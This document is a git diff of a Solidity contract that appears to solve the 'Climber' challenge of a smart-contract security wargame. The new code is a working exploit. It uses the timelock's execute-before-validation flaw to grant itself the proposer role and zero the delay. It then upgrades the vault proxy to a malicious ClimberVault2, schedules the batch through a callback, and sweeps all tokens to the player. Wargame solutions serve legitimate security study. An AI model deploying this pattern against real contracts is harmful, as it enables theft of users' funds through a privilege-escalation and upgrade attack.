@@ -4,6 +4,7 @@ pragma solidity ^0.8.0;
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "hardhat/console.sol";
 import "./ClimberVault.sol";
+import {PROPOSER_ROLE} from "./ClimberConstants.sol";
 
 interface ITimelock {
     function execute(
@@ -13,8 +14,6 @@ interface ITimelock {
         bytes32 salt
     ) external;
 
-    function grantRole(bytes32 role, address account) external;
-
     function schedule(
         address[] calldata targets,
         uint256[] calldata values,
@@ -23,11 +22,15 @@ interface ITimelock {
     ) external;
 }
 
-contract testClimber is ClimberVault {
+contract testClimber {
     address token;
     address timelock;
     address climber;
     address player;
+    address[] targets;
+    uint256[] values;
+    bytes[] dataElements;
+    bytes32 salt;
 
     constructor(
         address _token,
@@ -42,99 +45,43 @@ contract testClimber is ClimberVault {
     }
 
     function start() external {
+        targets = new address[](4);
+        values = new uint256[](4);
+        dataElements = new bytes[](4);
         //grant role
-        address[] memory targets = new address[](2);
-        targets[0] = timelock; //grant role
-        targets[1] = timelock; //call shedule
-        uint256[] memory values = new uint256[](2);
-        bytes[] memory dataElementsInner;
-        {
-            // dataElementsInner = new bytes[](2);
-            // dataElementsInner[0] = abi.encodeWithSignature(
-            //     "grantRole(byte32,address)",
-            //     PROPOSER_ROLE,
-            //     address(this)
-            // );
-            // dataElementsInner[1] = abi.encodeWithSignature(
-            //     "schedule(address[],uint256[],bytes[],bytes32)",
-            //     targets,
-            //     values,
-            //     dataElements,
-            //     bytes32("1")
-            // );
-        }
-        bytes[] memory dataElements = new bytes[](2);
+        targets[0] = timelock;
         dataElements[0] = abi.encodeWithSignature(
-            "grantRole(byte32,address)",
+            "grantRole(bytes32,address)",
             PROPOSER_ROLE,
             address(this)
         );
 
-        dataElements[1] = abi.encodeWithSignature(
-            "schedule(address[],uint256[],bytes[],bytes32)",
-            targets,
-            values,
-            dataElementsInner,
-            bytes32("1")
-        );
-
-        ITimelock(timelock).execute(
-            targets,
-            values,
-            dataElements,
-            bytes32("1")
-        );
-    }
-
-    function startbak() external {
-        //todo update delay 0
-        // function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
-        address[] memory targets = new address[](4);
-        targets[0] = timelock; //grant role
-        targets[1] = timelock; //update delay
-        targets[2] = climber; //update contract
-        targets[3] = timelock; //call shedule
-        uint256[] memory values = new uint256[](4);
-        bytes[] memory dataElements = new bytes[](4);
-
-        dataElements[0] = abi.encodeWithSignature(
-            "grantRole(byte32,address)",
-            PROPOSER_ROLE,
-            address(this)
-        );
+        //updatedelay
+        targets[1] = timelock;
         dataElements[1] = abi.encodeWithSignature(
             "updateDelay(uint64)",
             uint64(0)
         );
+
+        //update vault
+        address newVault = address(new ClimberVault2());
+        targets[2] = climber;
         dataElements[2] = abi.encodeWithSignature(
             "upgradeTo(address)",
-            address(this)
+            newVault
         );
-        dataElements[3] = abi.encodeWithSignature(
-            "schedule(address[],uint256[],bytes[],bytes32)",
-            address(this)
-        );
-        // function schedule(
-        //         address[] calldata targets,
-        //         uint256[] calldata values,
-        //         bytes[] calldata dataElements,
-        //         bytes32 salt
-        //     ) external
-        // ITimelock(timelock).schedule(
-        //     targets,
-        //     values,
-        //     dataElements,
-        //     bytes32("1")
-        // );
-        ITimelock(timelock).execute(
-            targets,
-            values,
-            dataElements,
-            bytes32("1")
-        );
-        //update vault to this contract
-        //transfer token to player
-        IERC20(token).transfer(player, IERC20(token).balanceOf(address(this)));
+
+        //schedule
+        targets[3] = address(this);
+        dataElements[3] = abi.encodeWithSignature("schedule()");
+
+        ITimelock(timelock).execute(targets, values, dataElements, salt);
+
+        ClimberVault2(climber).sweepFunds(token, player);
+    }
+
+    function schedule() public {
+        ITimelock(timelock).schedule(targets, values, dataElements, salt);
     }
 
     function printTokenBalance(
@@ -155,4 +102,14 @@ contract testClimber is ClimberVault {
     fallback() external payable {}
 
     receive() external payable {}
+}
+
+contract ClimberVault2 is ClimberVault {
+    function sweepFunds(address token, address to) external {
+        SafeTransferLib.safeTransfer(
+            token,
+            to,
+            IERC20(token).balanceOf(address(this))
+        );
+    }
 }
